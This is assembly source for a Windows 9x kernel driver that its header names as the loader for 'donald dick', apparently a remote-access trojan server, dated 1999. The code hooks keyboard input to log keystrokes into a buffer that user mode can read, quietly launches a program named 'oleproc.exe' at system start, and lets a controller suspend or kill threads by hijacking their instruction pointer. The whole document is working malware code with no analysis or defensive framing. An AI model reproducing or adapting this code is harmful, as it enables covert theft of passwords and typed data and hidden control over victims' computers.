;  donald dick loader for win 9X
;  also provides some services for the server
;  written by alexander yaworsky
;  '99

.386p

.XLIST
INCLUDE vmm.inc
INCLUDE vkd.inc
INCLUDE shell.inc
INCLUDE vwin32.inc
INCLUDE context.inc
.LIST


VMLDRIOCTL_KILLTHREAD       EQU   00220007h
VMLDRIOCTL_SUSPENDTHREAD    EQU   0022000Bh
VMLDRIOCTL_RESUMETHREAD     EQU   0022000Fh
VMLDRIOCTL_RESUMEALL        EQU   00220013h
VMLDRIOCTL_FORGETALL        EQU   00220017h
VMLDRIOCTL_GETSUSPENDED     EQU   0022001Bh
VMLDRIOCTL_REMOVETHREAD     EQU   0022001Fh
VMLDRIOCTL_GETKEYSTROKES    EQU   00220023h
VMLDRIOCTL_SETGETKEYMAP     EQU   00220027h
MAX_SUSPENDED_THREADS       EQU   64
VVMLDR_INIT_ORDER           EQU   SHELL_INIT_ORDER + 10
VMLDR_Device_Id             EQU   UNDEFINED_DEVICE_ID;3180h
KEYBUF_NV_MARK              EQU   256


Declare_Virtual_Device VVMLDRD, 4, 0, VVMLDRD_Control,\
                       VMLDR_Device_Id, VVMLDR_INIT_ORDER, ,


VxD_LOCKED_DATA_SEG

SuspendData  DD    MAX_SUSPENDED_THREADS * 3 DUP(0)   ; id, original eip and
                                                      ; ring 3 id for each
                                                      ; suspended thread
OrgKbdFilter DD   0
ExtKey       DB   0
E1Counter    DB   0

GetCurrentThread   DD    0
TerminateThread    DD    0

Ctx          CONTEXT  <>

Tail         DD    0              ; keystokes data structure
NVMark       DD    0
KeyCounter   DD    0
KeybufSz     DD    4096
Keystrokes   DB    4096 DUP(0)

KeyMap       DB    0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22
             DB    23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42
             DB    43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62
             DB    63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82
             DB    83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101
             DB    102,103,104,105,106,107,108,109,110,111,112,113,114,115,116
             DB    117,118,119,120,121,122,123,124,125,126,127
             ; map for keys with E0 prefix
             DB    0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22
             DB    23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42
             DB    43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62
             DB    63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82
             DB    83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101
             DB    102,103,104,105,106,107,108,109,110,111,112,113,114,115,116
             DB    117,118,119,120,121,122,123,124,125,126,127

ShPacket     DD    32+13
             DD    32
             DD    0
             DD    32
             DD    0
             DD    0
             DD    0
             DD    0
             DB    'oleproc.exe',0,0

VxD_LOCKED_DATA_ENDS


VxD_LOCKED_CODE_SEG

BeginProc    VVMLDRD_Control
             Control_Dispatch  Device_Init,             VVMLDRD_Device_Init
             Control_Dispatch  Sys_Dynamic_Device_Init, VVMLDRD_Device_Init2
             Control_Dispatch  Sys_Dynamic_Device_Exit, VVMLDRD_Device_Exit
             Control_Dispatch  W32_DeviceIoControl,     VVMLDRD_DeviceIoControl
             clc
             ret
EndProc      VVMLDRD_Control



ThreadTermination:
             call  GetCurrentThread
             push  DWORD PTR 0
             push  EAX
             call  TerminateThread
ThreadSuspension:
             jmp   SHORT ThreadSuspension

BeginProc    VVMLDRD_DeviceIoControl
             push  ESI
             push  EDI
             mov   EAX,dwIoControlCode[ESI]
             or    EAX,EAX
             jz    IoctlOk                       ; OPEN
             cmp   EAX,-1
             jz    IoctlOk                       ; CLOSEHANDLE
             cmp   EAX,VMLDRIOCTL_KILLTHREAD     ; initiated by DeviceIOControl
             jz    SHORT IoctlKillThread
             cmp   EAX,VMLDRIOCTL_SUSPENDTHREAD
             jz    IoctlSuspendThread
             cmp   EAX,VMLDRIOCTL_RESUMETHREAD
             jz    IoctlResumeThread
             cmp   EAX,VMLDRIOCTL_RESUMEALL
             jz    IoctlResumeAll
             cmp   EAX,VMLDRIOCTL_FORGETALL
             jz    IoctlForgetAll
             cmp   EAX,VMLDRIOCTL_GETSUSPENDED
             jz    IoctlGetSuspended
             cmp   EAX,VMLDRIOCTL_REMOVETHREAD
             jz    IoctlRemoveThread
             cmp   EAX,VMLDRIOCTL_GETKEYSTROKES
             jz    IoctlGetKeystrokes
             cmp   EAX,VMLDRIOCTL_SETGETKEYMAP
             jz    IoctlSetGetKeyMap
             jmp   IoctlError                    ; don't accept other codes
IoctlKillThread:
             mov   EBX,lpvInBuffer[ESI]
             or    EBX,EBX
             jz    IoctlError
             cmp   cbInBuffer[ESI],12            ; in: DWORD ring0 thr handle
                                                 ;     DWORD GetCurrentThread
                                                 ;     DWORD TerminateThread
             jnz   IoctlError
             mov   EDI,[EBX]
             push  EBX
             mov   ECX,MAX_SUSPENDED_THREADS
             mov   EBX,OFFSET32 SuspendData
ktIoctlFindThreadSlot:
             cmp   [EBX],EDI
             jz    SHORT ktIoctlThreadSlotFound
             add   EBX,12
             loop  ktIoctlFindThreadSlot
             jmp   SHORT ktCnt0
ktIoctlThreadSlotFound:
             mov   DWORD PTR [EBX],0             ; free slot
ktCnt0:
             pop   EBX
             mov   EAX,[EBX+4]
             mov   GetCurrentThread,EAX
             mov   EAX,[EBX+8]
             mov   TerminateThread,EAX
             mov   Ctx.ContextFlags,CONTEXT_FULL
             VxDcall  _VWIN32_Get_Thread_Context, <EDI,OFFSET32 Ctx>
             or    EAX,EAX
             jz    IoctlOk
             mov   Ctx.Eip,OFFSET32 ThreadTermination
             VxDcall  _VWIN32_Set_Thread_Context, <EDI,OFFSET32 Ctx>
             jmp   IoctlOk
IoctlSuspendThread:
             mov   EBX,lpvInBuffer[ESI]
             or    EBX,EBX
             jz    IoctlError
             cmp   cbInBuffer[ESI],8             ; in: DWORD ring0 thr handle
                                                 ;     DWORD ring3 thr id
             jnz   IoctlError
             mov   Ctx.ContextFlags,CONTEXT_FULL
             push  EBX
             VxDcall  _VWIN32_Get_Thread_Context, <[EBX],OFFSET32 Ctx>
             pop   EBX
             or    EAX,EAX
             jz    IoctlOk
             mov   ECX,MAX_SUSPENDED_THREADS
             mov   EDI,OFFSET32 SuspendData
             xor   EAX,EAX
IoctlFindSlotLoop:                               ; find free slot
             cmp   [EDI],EAX
             jz    IoctlSlotFound
             mov   EDX,[EBX]
             cmp   [EDI],EDX
             jz    IoctlOk                       ; already suspended
             add   EDI,12
             loop  IoctlFindSlotLoop
             jmp   IoctlOk                       ; free slot not found
IoctlSlotFound:
             mov   EAX,[EBX]
             mov   [EDI],EAX           ; save id,
             mov   EAX,Ctx.Eip         ; original eip,
             mov   [EDI+4],EAX
             mov   EAX,[EBX+4]         ; ring3 id
             mov   [EDI+8],EAX
             mov   Ctx.Eip,OFFSET32 ThreadSuspension  ; and enter the loop
             VxDcall  _VWIN32_Set_Thread_Context, <[EBX],OFFSET32 Ctx>
             jmp   IoctlOk
IoctlResumeThread:
             mov   EBX,lpvInBuffer[ESI]
             or    EBX,EBX
             jz    IoctlError
             cmp   cbInBuffer[ESI],4             ; in: DWORD ring0 thr handle
             jnz   IoctlError
             mov   EDI,[EBX]
             mov   Ctx.ContextFlags,CONTEXT_FULL
             VxDcall  _VWIN32_Get_Thread_Context, <EDI,OFFSET32 Ctx>
             mov   EDX,EAX
             mov   ECX,MAX_SUSPENDED_THREADS
             mov   EBX,OFFSET32 SuspendData
IoctlFindThreadSlot:
             cmp   [EBX],EDI
             jz    SHORT IoctlThreadSlotFound
             add   EBX,12
             loop  IoctlFindThreadSlot
             jmp   IoctlOk                       ; not suspended
IoctlThreadSlotFound:
             xor   EAX,EAX
             mov   [EBX],EAX           ; free slot
             or    EDX,EDX
             jz    IoctlOk             ; error in GetThreadContext
             mov   EAX,[EBX+4]
             mov   Ctx.Eip,EAX         ; restore eip
             VxDcall  _VWIN32_Set_Thread_Context, <EDI,OFFSET32 Ctx>
             jmp   IoctlOk
IoctlResumeAll:
             mov   ECX,MAX_SUSPENDED_THREADS
             mov   EDI,OFFSET32 SuspendData
IoctlResumeLoop:
             push  ECX
             mov   EAX,[EDI]
             or    EAX,EAX
             jz    SHORT IoctlResumeCntLoop
             mov   Ctx.ContextFlags,CONTEXT_FULL
             VxDcall  _VWIN32_Get_Thread_Context, <[EDI],OFFSET32 Ctx>
             or    EAX,EAX
             jz    SHORT IoctlResumeCntLoop
             mov   EAX,[EDI+4]
             mov   Ctx.Eip,EAX         ; restore eip
             VxDcall  _VWIN32_Set_Thread_Context, <[EDI],OFFSET32 Ctx>
             xor   EAX,EAX
             mov   [EDI],EAX           ; free slot
IoctlResumeCntLoop:
             add   EDI,12
             pop   ECX
             loop  IoctlResumeLoop
             jmp   IoctlOk
IoctlForgetAll:
             mov   ECX,MAX_SUSPENDED_THREADS
             mov   EDI,OFFSET32 SuspendData
IoctlForgetLoop:
             xor   EAX,EAX
             mov   [EDI],EAX           ; free slot
             add   EDI,12
             loop  IoctlForgetLoop
             jmp   IoctlOk
IoctlGetSuspended:
             mov   EBX,lpvOutBuffer[ESI]
             or    EBX,EBX
             jz    IoctlError
             cmp   cbOutBuffer[ESI],MAX_SUSPENDED_THREADS * 4
             jb    IoctlError
             mov   EDX,lpcbBytesReturned[ESI]
             or    EDX,EDX
             jz    IoctlError
             mov   ECX,MAX_SUSPENDED_THREADS
             mov   EDI,OFFSET32 SuspendData
             xor   EAX,EAX
IoctlGetLoop:
             cmp   DWORD PTR [EDI],0
             jz    SHORT IoctlGetCnt
             mov   EDX,[EDI+8]
             mov   [EBX],EDX
             inc   EAX
             add   EBX,4
IoctlGetCnt:
             add   EDI,12
             loop  IoctlGetLoop
             mov   EBX,lpcbBytesReturned[ESI]
             mov   [EBX],EAX
             jmp   IoctlOk
IoctlRemoveThread:
             mov   EBX,lpvInBuffer[ESI]
             or    EBX,EBX
             jz    IoctlError
             cmp   cbInBuffer[ESI],4             ; in: DWORD ring3 thr id
             jnz   SHORT IoctlError
             mov   EDX,[EBX]
             xor   EAX,EAX
             mov   ECX,MAX_SUSPENDED_THREADS
             mov   EBX,OFFSET32 SuspendData
rtIoctlFindThreadSlot:
             cmp   [EBX],EAX
             jz    SHORT rtCnt0
             cmp   [EBX+8],EDX
             jz    SHORT rtIoctlThreadSlotFound
rtCnt0:
             add   EBX,12
             loop  rtIoctlFindThreadSlot
             jmp   SHORT IoctlOk
rtIoctlThreadSlotFound:
             mov   DWORD PTR [EBX],0             ; free slot
             jmp   IoctlOk
IoctlGetKeystrokes:
             mov   EDI,lpvOutBuffer[ESI]
             or    EDI,EDI
             jz    IoctlError
             mov   ECX,4096+16
             cmp   cbOutBuffer[ESI],ECX
             jnz   IoctlError
             mov   ESI,OFFSET32 Tail ; start of keystroke data
             cli
       rep   movsb
             sti
             jmp   IoctlOk
IoctlSetGetKeyMap:
             mov   EBX,lpvOutBuffer[ESI]
             or    EBX,EBX
             jz    IoctlError
             mov   ECX,256
             cmp   cbOutBuffer[ESI],ECX
             jnz   IoctlError
             mov   EDI,lpvInBuffer[ESI]
             or    EDI,EDI
             jz    IoctlGetKeyMap
             cmp   cbInBuffer[ESI],ECX
             jnz   IoctlGetKeyMap
             mov   ESI,EDI
             mov   EDI,OFFSET32 KeyMap
             cli
       rep   movsb
             sti
IoctlGetKeyMap:
             mov   EDI,EBX
             mov   ECX,256
             mov   ESI,OFFSET32 KeyMap
       rep   movsb
             jmp   IoctlOk
IoctlError:
             xor   EAX,EAX
             dec   EAX
             jmp   SHORT IoctlExit
IoctlOk:
             xor   EAX,EAX
IoctlExit:
             pop   EDI
             pop   ESI
             clc
             ret
EndProc      VVMLDRD_DeviceIoControl

BeginProc    KeyHook
             push  EAX
             push  EBX
             push  ESI
             cmp   E1Counter,0
             jz    SHORT kh_cnt0
             dec   E1Counter           ; ignore keystrokes after E1 code
             jmp   khExit
kh_cnt0:
             cmp   CL,0E0h
             jz    khExtended          ; handle extended key prefix
             cmp   CL,0E1h
             jnz   SHORT kh_cnt0_1
             mov   E1Counter,2         ; handle E1 code
             jmp   khExit
kh_cnt0_1:
             xor   EBX,EBX
             mov   AL,CL
             and   AL,80h    ; save release bit
             and   CL,7Fh
             cmp   ExtKey,0
             mov   ExtKey,0
             jz    SHORT kh_cnt1
             or    CL,80h    ; use second table for extended keys
kh_cnt1:
             mov   BL,CL
             mov   CL,KeyMap[EBX]      ; remap key
             and   CL,7Fh
             or    AL,AL
             jnz   SHORT kh_cnt2       ; don't put in buffer released strokes
             cmp   BL,02h
             jb    SHORT kh_cnt2       ; put only interesting keys
             cmp   BL,1Ch
             jbe   SHORT kh_put
             cmp   BL,35h OR 80h       ; gray slash
             jz    SHORT kh_put
             cmp   BL,1Ch OR 80h       ; gray enter
             jz    SHORT kh_put
             cmp   BL,1Eh
             jb    SHORT kh_cnt2
             cmp   BL,29h
             jbe   SHORT kh_put
             cmp   BL,2Bh
             jb    SHORT kh_cnt2
             cmp   BL,35h
             jbe   SHORT kh_put
             cmp   BL,37h
             jz    SHORT kh_put
             cmp   BL,39h
             jz    SHORT kh_put
             cmp   BL,47h
             jb    SHORT kh_cnt2
             cmp   BL,53h
             ja    SHORT kh_cnt2
kh_put:
             mov   ESI,Tail
             mov   Keystrokes[ESI],BL  ; save original keystroke
             inc   ESI
             cmp   ESI,KEYBUF_NV_MARK
             jb    SHORT kh_cnt1_1
             cmp   NVMark,0
             jnz   SHORT kh_cnt1_1
             mov   NVMark,ESI
kh_cnt1_1:
             inc   KeyCounter
             cmp   ESI,KeybufSz
             jb    SHORT kh_cnt1_2
             mov   ESI,NVMark
kh_cnt1_2:
             mov   Tail,ESI
kh_cnt2:
             or    CL,AL     ; restore release bit
             jmp   SHORT khExit
khExtended:
             mov   ExtKey,1
khExit:
             cmp   CL,1      ; set carry if 0 to reject keystroke
             pop   ESI
             pop   EBX
             pop   EAX
             jmp   [OrgKbdFilter]
EndProc      KeyHook

BeginProc    VVMLDRD_AppyTimeCallback
             VxDcall  _SHELL_ShellExecute, <OFFSET32 ShPacket>
             ret
EndProc      VVMLDRD_AppyTimeCallback

BeginProc    VVMLDRD_Device_Init2
             cmp   OrgKbdFilter,0
             jnz   SHORT di2_exit
             GetVxDServiceOrdinal EAX, VKD_Filter_Keyboard_Input
             mov   ESI,OFFSET32 KeyHook
             VMMcall  Hook_Device_Service
             jc    SHORT di2_exit
             mov   OrgKbdFilter,ESI
di2_exit:
             clc                       ; no error - load VxD
             ret
EndProc      VVMLDRD_Device_Init2


BeginProc    VVMLDRD_Device_Exit
             cmp   OrgKbdFilter,0
             jz    SHORT de_exit
             GetVxDServiceOrdinal EAX, VKD_Filter_Keyboard_Input
             mov   ESI,OFFSET32 KeyHook
             VMMcall  Unhook_Device_Service
             jnc   SHORT de_cnt1
             ret
de_cnt1:
             mov   OrgKbdFilter,0
de_exit:
             clc
             ret
EndProc      VVMLDRD_Device_Exit


BeginProc    VVMLDRD_Device_Init
             VxDcall  _SHELL_CallAtAppyTime, <OFFSET32 VVMLDRD_AppyTimeCallback, 0, 0, 0>
             call  VVMLDRD_Device_init2
             ret
EndProc      VVMLDRD_Device_Init


VxD_LOCKED_CODE_ENDS

             END
